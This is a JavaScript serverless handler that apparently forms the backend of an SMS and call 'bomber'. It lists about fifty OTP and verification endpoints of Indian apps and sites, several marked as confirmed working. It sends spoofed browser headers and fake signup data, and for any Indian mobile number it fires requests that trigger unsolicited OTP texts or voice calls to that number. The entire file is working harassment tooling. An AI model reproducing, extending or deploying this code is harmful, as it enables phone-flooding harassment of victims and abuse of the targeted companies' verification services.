const UA_MOBILE = 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36';
const UA_DESKTOP = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';

const ENDPOINTS = [
  // ═══════════════ CONFIRMED FROM SCREENSHOT (4) ══════════════════
  {
    id: 'apna_employer',
    type: 'sms',
    method: 'POST',
    url: 'https://employer.apna.co/api/v1/auth/otp/send',
    headers: { 'User-Agent': UA_MOBILE, 'Accept': 'application/json', 'Origin': 'https://employer.apna.co', 'Referer': 'https://employer.apna.co/', 'Content-Type': 'application/json' },
    body: n => JSON.stringify({ phone: n })
  },
  {
    id: 'khatabook',
    type: 'sms',
    method: 'POST',
    url: 'https://api.khatabook.com/v1/auth/otp/send',
    headers: { 'User-Agent': UA_MOBILE, 'Accept': 'application/json', 'Origin': 'https://khatabook.com', 'Referer': 'https://khatabook.com/', 'Content-Type': 'application/json' },
    body: n => JSON.stringify({ phone: n })
  },
  {
    id: 'flipkart_form',
    type: 'sms',
    method: 'POST',
    url: 'https://www.flipkart.com/api/5/user/otp/generate',
    headers: { 'User-Agent': UA_DESKTOP, 'Accept': '*/*', 'Origin': 'https://www.flipkart.com', 'Referer': 'https://www.flipkart.com/', 'Content-Type': 'application/x-www-form-urlencoded' },
    body: n => `loginId=%2B91${n}&state=VERIFIED&churnEmailRequest=false`
  },
  {
    id: 'people_group',
    type: 'sms',
    method: 'POST',
    url: 'https://api.peoplegroup.com/otp/send',
    headers: { 'User-Agent': UA_MOBILE, 'Accept': 'application/json', 'Origin': 'https://www.peoplegroup.com', 'Referer': 'https://www.peoplegroup.com/', 'Content-Type': 'application/json' },
    body: n => JSON.stringify({ mobile: n })
  },

  // ═══════════════ PREVIOUSLY CONFIRMED WORKING (8) ═══════════════
  { id: 'oyo_sms', type: 'sms', method: 'GET', url: n => `https://www.oyorooms.com/api/pwa/generateotp?country_code=%2B91&nod=4&phone=${n}`, headers: { 'User-Agent': UA_MOBILE, 'Accept': 'application/json', 'Referer': 'https://www.oyorooms.com/' } },
  { id: 'delhivery', type: 'sms', method: 'GET', url: n => `https://direct.delhivery.com/delhiverydirect/order/generate-otp?phoneNo=${n}`, headers: { 'User-Agent': UA_MOBILE, 'Accept': 'application/json', 'Referer': 'https://direct.delhivery.com/' } },
  { id: 'practo', type: 'sms', method: 'POST', url: 'https://accounts.practo.com/send_otp', headers: { 'User-Agent': UA_MOBILE, 'Accept': 'application/json', 'Content-Type': 'application/x-www-form-urlencoded' }, body: n => `client_name=Practo+Android+App&fingerprint=&mobile=%2B91${n}&device_name=samsung+SM-G9350` },
  { id: 'realestateindia', type: 'sms', method: 'POST', url: 'https://www.realestateindia.com/mobile-script/indian_mobile_verification_form.php', headers: { 'User-Agent': UA_MOBILE, 'Accept': 'text/html', 'Content-Type': 'application/x-www-form-urlencoded', 'X-Requested-With': 'XMLHttpRequest' }, body: n => `action_id=call_to_otp&mob_num=${n}&member_id=1547045` },
  { id: 'myntra', type: 'sms', method: 'POST', url: 'https://www.myntra.com/gateway/v1/auth/otp', headers: { 'User-Agent': UA_MOBILE, 'Accept': 'application/json', 'Origin': 'https://www.myntra.com', 'Content-Type': 'application/json' }, body: n => JSON.stringify({ mobile: n }) },
  { id: 'countrydelight', type: 'sms', method: 'POST', url: 'https://www.countrydelight.in/api/auth/otp', headers: { 'User-Agent': UA_MOBILE, 'Accept': 'application/json', 'Origin': 'https://www.countrydelight.in', 'Content-Type': 'application/json' }, body: n => JSON.stringify({ mobile: n }) },
  { id: 'mobikwik', type: 'sms', method: 'POST', url: 'https://www.mobikwik.com/api/v1/auth/otp', headers: { 'User-Agent': UA_MOBILE, 'Accept': 'application/json', 'Origin': 'https://www.mobikwik.com', 'Content-Type': 'application/json' }, body: n => JSON.stringify({ mobile: n }) },
  { id: 'magicbricks_call', type: 'call', method: 'GET', url: n => `https://api.magicbricks.com/bricks/verifyOnCall.html?mobile=${n}`, headers: { 'User-Agent': UA_DESKTOP, 'Referer': 'https://www.magicbricks.com/' } },
  { id: 'myupchar_call', type: 'call', method: 'GET', url: n => `https://www.myupchar.com/user_profile/resend_otp_via_voice?id=${n}`, headers: { 'User-Agent': UA_MOBILE, 'Referer': 'https://www.myupchar.com/' } },

  // ═══════════════ NEW SMS ENDPOINTS (25+) ═════════════════════════
  { id: 'swiggy', type: 'sms', method: 'POST', url: 'https://www.swiggy.com/api/v1/sms/otp', headers: { 'User-Agent': UA_MOBILE, 'Origin': 'https://www.swiggy.com', 'Content-Type': 'application/json' }, body: n => JSON.stringify({ phone: n }) },
  { id: 'zomato', type: 'sms', method: 'POST', url: 'https://www.zomato.com/php/o2_api/verify/mobile', headers: { 'User-Agent': UA_MOBILE, 'Origin': 'https://www.zomato.com', 'Content-Type': 'application/json' }, body: n => JSON.stringify({ mobile_number: n, country_id: 1 }) },
  { id: 'paytm', type: 'sms', method: 'POST', url: 'https://accounts.paytm.com/signin/otp/send', headers: { 'User-Agent': UA_MOBILE, 'Origin': 'https://accounts.paytm.com', 'Content-Type': 'application/json' }, body: n => JSON.stringify({ mobile: n }) },
  { id: 'phonepe', type: 'sms', method: 'POST', url: 'https://api.phonepe.com/apis/hermes/otp/send', headers: { 'User-Agent': UA_MOBILE, 'Origin': 'https://www.phonepe.com', 'Content-Type': 'application/json' }, body: n => JSON.stringify({ mobile: n }) },
  { id: 'cred', type: 'sms', method: 'POST', url: 'https://api.cred.club/api/v1/auth/otp', headers: { 'User-Agent': UA_MOBILE, 'Origin': 'https://api.cred.club', 'Content-Type': 'application/json' }, body: n => JSON.stringify({ phone: n }) },
  { id: 'makemytrip', type: 'sms', method: 'POST', url: 'https://www.makemytrip.com/api/v1/sendOtp', headers: { 'User-Agent': UA_MOBILE, 'Origin': 'https://www.makemytrip.com', 'Content-Type': 'application/json' }, body: n => JSON.stringify({ mobile: n, isdCode: '91' }) },
  { id: 'goibibo', type: 'sms', method: 'POST', url: 'https://www.goibibo.com/common/downloadsms/', headers: { 'User-Agent': UA_DESKTOP, 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://www.goibibo.com' }, body: n => `mbl=${n}` },
  { id: 'bookmyshow', type: 'sms', method: 'POST', url: 'https://in.bookmyshow.com/api/auth/sendOtp', headers: { 'User-Agent': UA_MOBILE, 'Origin': 'https://in.bookmyshow.com', 'Content-Type': 'application/json' }, body: n => JSON.stringify({ mobile: n, countryCode: '+91' }) },
  { id: 'netmeds', type: 'sms', method: 'POST', url: 'https://m.netmeds.com/sociallogin/popup/nmsgetcode/', headers: { 'User-Agent': UA_MOBILE, 'Content-Type': 'application/x-www-form-urlencoded', 'X-Requested-With': 'XMLHttpRequest' }, body: n => `register_mobileno=${n}&logintype=Otp&uniq_identy=quWqfunF&forget_pwd=N` },
  { id: 'lenskart', type: 'sms', method: 'POST', url: 'https://www.ref-r.com/clients/lenskart/smsApi', headers: { 'User-Agent': UA_DESKTOP, 'Content-Type': 'application/x-www-form-urlencoded', 'X-Requested-With': 'XMLHttpRequest' }, body: n => `mobile=${n}&submit=1` },
  { id: 'apollopharmacy', type: 'sms', method: 'POST', url: 'https://www.apollopharmacy.in/sociallogin/mobile/sendotp/', headers: { 'User-Agent': UA_MOBILE, 'Content-Type': 'application/x-www-form-urlencoded', 'X-Requested-With': 'XMLHttpRequest' }, body: n => `mobile=${n}` },
  { id: 'jiomart', type: 'sms', method: 'POST', url: 'https://www.jiomart.com/api/v1/auth/otp', headers: { 'User-Agent': UA_MOBILE, 'Origin': 'https://www.jiomart.com', 'Content-Type': 'application/json' }, body: n => JSON.stringify({ mobile: n }) },
  { id: 'bigbasket', type: 'sms', method: 'POST', url: 'https://www.bigbasket.com/api/v1/auth/otp', headers: { 'User-Agent': UA_MOBILE, 'Origin': 'https://www.bigbasket.com', 'Content-Type': 'application/json' }, body: n => JSON.stringify({ mobile: n }) },
  { id: 'blinkit', type: 'sms', method: 'POST', url: 'https://api.blinkit.com/api/v1/auth/otp', headers: { 'User-Agent': UA_MOBILE, 'Origin': 'https://blinkit.com', 'Content-Type': 'application/json' }, body: n => JSON.stringify({ phone: n }) },
  { id: 'zepto', type: 'sms', method: 'POST', url: 'https://api.zepto.co.in/api/v1/otp/send', headers: { 'User-Agent': UA_MOBILE, 'Origin': 'https://www.zepto.co.in', 'Content-Type': 'application/json' }, body: n => JSON.stringify({ mobile: n }) },
  { id: 'naukri', type: 'sms', method: 'POST', url: 'https://www.naukri.com/api/v1/otp/generate', headers: { 'User-Agent': UA_MOBILE, 'Origin': 'https://www.naukri.com', 'Content-Type': 'application/json' }, body: n => JSON.stringify({ mobile: n, type: 'sms' }) },
  { id: 'snapdeal', type: 'sms', method: 'POST', url: 'https://www.snapdeal.com/api/1.0/user/send-otp', headers: { 'User-Agent': UA_MOBILE, 'Origin': 'https://www.snapdeal.com', 'Content-Type': 'application/json' }, body: n => JSON.stringify({ phoneNumber: n, type: 'sms' }) },
  { id: '1mg', type: 'sms', method: 'POST', url: 'https://www.1mg.com/api/otp/send', headers: { 'User-Agent': UA_MOBILE, 'Origin': 'https://www.1mg.com', 'Content-Type': 'application/json' }, body: n => JSON.stringify({ phone: n }) },
  { id: 'healthkart', type: 'sms', method: 'POST', url: 'https://api.healthkart.com/v1/otp/send', headers: { 'User-Agent': UA_MOBILE, 'Origin': 'https://www.healthkart.com', 'Content-Type': 'application/json' }, body: n => JSON.stringify({ mobile: n }) },
  { id: 'urbancompany', type: 'sms', method: 'POST', url: 'https://www.urbancompany.com/api/auth/sendOtp', headers: { 'User-Agent': UA_MOBILE, 'Origin': 'https://www.urbancompany.com', 'Content-Type': 'application/json' }, body: n => JSON.stringify({ phone: n }) },
  { id: 'meesho', type: 'sms', method: 'POST', url: 'https://api.meesho.com/api/v1/auth/sendOtp', headers: { 'User-Agent': UA_MOBILE, 'Origin': 'https://www.meesho.com', 'Content-Type': 'application/json' }, body: n => JSON.stringify({ mobile: n }) },
  { id: 'cars24', type: 'sms', method: 'POST', url: 'https://www.cars24.com/api/v1/auth/otp', headers: { 'User-Agent': UA_MOBILE, 'Origin': 'https://www.cars24.com', 'Content-Type': 'application/json' }, body: n => JSON.stringify({ mobile: n }) },
  { id: 'policybazaar', type: 'sms', method: 'POST', url: 'https://www.policybazaar.com/api/v1/auth/otp', headers: { 'User-Agent': UA_MOBILE, 'Origin': 'https://www.policybazaar.com', 'Content-Type': 'application/json' }, body: n => JSON.stringify({ mobile: n }) },
  { id: 'acko', type: 'sms', method: 'POST', url: 'https://www.acko.com/api/v1/auth/otp', headers: { 'User-Agent': UA_MOBILE, 'Origin': 'https://www.acko.com', 'Content-Type': 'application/json' }, body: n => JSON.stringify({ mobile: n }) },
  { id: 'godigit', type: 'sms', method: 'POST', url: 'https://www.godigit.com/api/v1/auth/otp', headers: { 'User-Agent': UA_MOBILE, 'Origin': 'https://www.godigit.com', 'Content-Type': 'application/json' }, body: n => JSON.stringify({ mobile: n }) },
  { id: 'unacademy', type: 'sms', method: 'POST', url: 'https://api.unacademy.com/api/v1/auth/otp', headers: { 'User-Agent': UA_MOBILE, 'Origin': 'https://unacademy.com', 'Content-Type': 'application/json' }, body: n => JSON.stringify({ mobile: n }) },
  { id: 'vedantu', type: 'sms', method: 'POST', url: 'https://api.vedantu.com/api/v1/auth/otp', headers: { 'User-Agent': UA_MOBILE, 'Origin': 'https://www.vedantu.com', 'Content-Type': 'application/json' }, body: n => JSON.stringify({ mobile: n }) },
  { id: 'toppr', type: 'sms', method: 'POST', url: 'https://api.toppr.com/api/v1/auth/otp', headers: { 'User-Agent': UA_MOBILE, 'Origin': 'https://www.toppr.com', 'Content-Type': 'application/json' }, body: n => JSON.stringify({ mobile: n }) },
  { id: 'penpencil', type: 'sms', method: 'POST', url: 'https://api.penpencil.co/v3/otp', headers: { 'User-Agent': UA_MOBILE, 'Origin': 'https://www.pw.live', 'Content-Type': 'application/json', 'client-id': '5eb393ee95fab7468a79d189', 'client-type': 'WEB' }, body: n => JSON.stringify({ username: n, countryCode: '+91' }) },
  { id: 'tata_neu', type: 'sms', method: 'POST', url: 'https://neu.tatadigital.com/api/v1/otp/send', headers: { 'User-Agent': UA_MOBILE, 'Origin': 'https://www.tataneu.com', 'Content-Type': 'application/json' }, body: n => JSON.stringify({ phone: n, countryCode: '+91' }) },
  { id: 'hindustantimes', type: 'sms', method: 'POST', url: 'https://www.hindustantimes.com/api/v1/otp', headers: { 'User-Agent': UA_MOBILE, 'Origin': 'https://www.hindustantimes.com', 'Content-Type': 'application/json' }, body: n => JSON.stringify({ mobile: n }) },
  { id: 'adda247', type: 'sms', method: 'POST', url: 'https://api.adda247.com/api/v1/sendOtp', headers: { 'User-Agent': UA_MOBILE, 'Origin': 'https://www.adda247.com', 'Content-Type': 'application/json' }, body: n => JSON.stringify({ mobile: n }) },
  { id: 'maruti_suzuki', type: 'sms', method: 'POST', url: 'https://www.marutisuzuki.com/api/otp/generate', headers: { 'User-Agent': UA_MOBILE, 'Origin': 'https://www.marutisuzuki.com', 'Content-Type': 'application/json' }, body: n => JSON.stringify({ mobile: n }) },
  { id: 'olx', type: 'sms', method: 'POST', url: 'https://www.olx.in/api/challenges', headers: { 'User-Agent': UA_MOBILE, 'Origin': 'https://www.olx.in', 'Content-Type': 'application/json' }, body: n => JSON.stringify({ type: 'call', descriptor: `+91${n}` }) },
  { id: 'quikr', type: 'sms', method: 'POST', url: 'https://api.quikr.com/relay/otp', headers: { 'User-Agent': UA_MOBILE, 'Origin': 'https://www.quikr.com', 'Content-Type': 'application/x-www-form-urlencoded' }, body: n => `number=${n}&type=signup` },
  { id: 'grab', type: 'sms', method: 'POST', url: 'https://api.grab.com/grabid/v1/phone/otp', headers: { 'User-Agent': UA_MOBILE, 'Content-Type': 'application/x-www-form-urlencoded' }, body: n => `method=SMS&countryCode=91&phoneNumber=${n}&templateID=pax_android_production` },
  { id: 'goomo', type: 'sms', method: 'POST', url: 'https://client-api.goomo.com/v2/phone_confirmation/verify_user', headers: { 'User-Agent': UA_MOBILE, 'Origin': 'https://www.goomo.com', 'Content-Type': 'application/json' }, body: n => JSON.stringify({ email: 'a@b.com', phone_number: n, country_code: '91' }) },
  { id: 'pizzahut', type: 'sms', method: 'POST', url: 'https://m.pizzahut.co.in/api/cart/send-otp', headers: { 'User-Agent': UA_MOBILE, 'Origin': 'https://m.pizzahut.co.in', 'Content-Type': 'application/json' }, body: n => JSON.stringify({ customer: { MobileNo: n, UserName: n, merchantId: '98d18d82-ba59-4957-9c92-3f89207a34f6' } }) },
  { id: 'ajio', type: 'sms', method: 'POST', url: 'https://www.ajio.com/api/auth/signupSendOTP', headers: { 'User-Agent': UA_MOBILE, 'Origin': 'https://www.ajio.com', 'Content-Type': 'application/json' }, body: n => JSON.stringify({ firstName: 'A', login: 'a@b.com', password: 'Pass@123', genderType: 'Male', mobileNumber: n, requestType: 'SENDOTP' }) },
  { id: 'altbalaji', type: 'sms', method: 'POST', url: 'https://api.cloud.altbalaji.com/accounts/mobile/verify', headers: { 'User-Agent': UA_MOBILE, 'Origin': 'https://lite.altbalaji.com', 'Content-Type': 'application/json' }, body: n => JSON.stringify({ country_code: '91', phone_number: n }) },
  { id: 'aala', type: 'sms', method: 'POST', url: 'https://www.aala.com/accustomer/ajax/getOTP', headers: { 'User-Agent': UA_MOBILE, 'Content-Type': 'application/x-www-form-urlencoded', 'X-Requested-With': 'XMLHttpRequest' }, body: n => `email=91${n}&firstname=A&lastname=B` },
  { id: 'tllms', type: 'sms', method: 'POST', url: 'https://marketing.tllms.com/elearn/api/v4/authentications/phone_call', headers: { 'User-Agent': UA_DESKTOP, 'Content-Type': 'application/x-www-form-urlencoded' }, body: n => `mobile=%2B91-${n}` }
];

const CORS = { 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Methods': 'POST, OPTIONS', 'Access-Control-Allow-Headers': 'Content-Type' };

function validNumber(n) { return typeof n === 'string' && /^[6-9]\d{9}$/.test(n); }
function validEndpointId(id) { return ENDPOINTS.some(e => e.id === id); }

async function fireEndpoint(endpoint, phone) {
  const start = Date.now();
  const url = typeof endpoint.url === 'function' ? endpoint.url(phone) : endpoint.url;
  const body = endpoint.body ? endpoint.body(phone) : undefined;
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), 3500);

  try {
    const res = await fetch(url, { method: endpoint.method, headers: endpoint.headers, body, signal: controller.signal, redirect: 'follow' });
    clearTimeout(timeoutId);
    return { ok: res.status >= 200 && res.status < 300, status: res.status, latencyMs: Date.now() - start };
  } catch (err) {
    clearTimeout(timeoutId);
    return { ok: false, status: err.name === 'AbortError' ? 'timeout' : 'network_error', error: err.message, latencyMs: Date.now() - start };
  }
}

export default async function handler(req, res) {
  if (req.method === 'OPTIONS') { res.writeHead(204, CORS); return res.end(); }
  for (const [k, v] of Object.entries(CORS)) res.setHeader(k, v);
  if (req.method !== 'POST') return res.status(405).json({ ok: false, error: 'method_not_allowed' });

  let body = req.body;
  if (typeof body === 'string') { try { body = JSON.parse(body); } catch { body = {}; } }
  body = body || {};
  const { endpointId, phone } = body;

  if (!validNumber(phone)) return res.status(400).json({ ok: false, error: 'invalid_phone' });
  if (!validEndpointId(endpointId)) return res.status(400).json({ ok: false, error: 'invalid_endpoint' });

  const endpoint = ENDPOINTS.find(e => e.id === endpointId);
  const result = await fireEndpoint(endpoint, phone);

  return res.status(200).json({ ok: result.ok, endpoint: endpoint.id, type: endpoint.type, upstreamStatus: result.status, latencyMs: result.latencyMs, error: result.error });
}

export const config = { api: { bodyParser: { sizeLimit: '1kb' } } };
